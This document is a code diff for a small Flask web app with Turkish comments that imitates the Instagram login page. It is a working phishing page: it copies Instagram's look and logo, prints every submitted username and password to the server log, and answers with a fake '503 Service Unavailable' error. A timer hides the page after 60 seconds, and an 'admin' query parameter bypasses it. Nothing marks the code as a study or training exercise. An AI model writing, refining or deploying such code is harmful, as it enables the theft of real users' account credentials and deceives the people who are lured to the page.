@@ -1,28 +1,30 @@
 import os
-from flask import Flask, request, render_template_string, session
-from datetime import datetime, timedelta
+import time
+from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
-app.secret_key = 'cok_gizli_bir_key' # Bu satır olmazsa hata verir
+START_TIME = time.time()
 
-# --- INSTAGRAM TASARIMI ---
+# --- INSTAGRAM TASARIMI (GÜVENLİ LOGO LİNKİ) ---
 HTML_KODU = """
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Giriş Yap • Instagram</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
-        .logo { width: 175px; margin-bottom: 20px; }
+        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
+        /* Logo için alternatif güvenli link */
+        .logo { width: 175px; margin-bottom: 20px; content: url("https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"); }
         input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
-        button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="box">
-        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511109452.png" class="logo">
+        <div class="logo"></div>
         <form method="POST" action="/login">
             <input type="text" name="u" placeholder="Kullanıcı adı" required>
             <input type="password" name="p" placeholder="Şifre" required>
@@ -33,30 +35,23 @@ HTML_KODU = """
 </html>
 """
 
-HATA_SAYFASI = """<h1 style='text-align:center;margin-top:100px;'>503 Service Unavailable</h1>"""
+HATA_EKRANI = """<h1 style='text-align:center;margin-top:100px;font-family:sans-serif;'>503 Service Unavailable</h1><p style='text-align:center;'>Sunucu bakimda, lutfen sonra deneyin.</p>"""
 
 @app.route('/')
 def home():
-    # Admin isen sınırsız giriş
-    if request.args.get('admin') == '1':
-        return render_template_string(HTML_KODU)
-
-    # İlk defa giren kişi için süre başlat
-    if 'baslangic' not in session:
-        session['baslangic'] = datetime.now().timestamp()
+    is_admin = request.args.get('admin') == '1'
+    gecen_sure = time.time() - START_TIME
     
-    gecen_sure = datetime.now().timestamp() - session['baslangic']
-    
-    # 60 saniye dolduysa hata ver
-    if gecen_sure > 60:
-        return HATA_SAYFASI, 503
-    
+    if gecen_sure > 60 and not is_admin:
+        return HATA_EKRANI, 503
+        
     return render_template_string(HTML_KODU)
 
 @app.route('/login', methods=['POST'])
 def login():
-    print(f"VERI: {request.form.get('u')} | {request.form.get('p')}")
-    return HATA_SAYFASI, 503
+    print(f"--- VERI --- User: {request.form.get('u')} | Pass: {request.form.get('p')}")
+    return HATA_EKRANI, 503
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
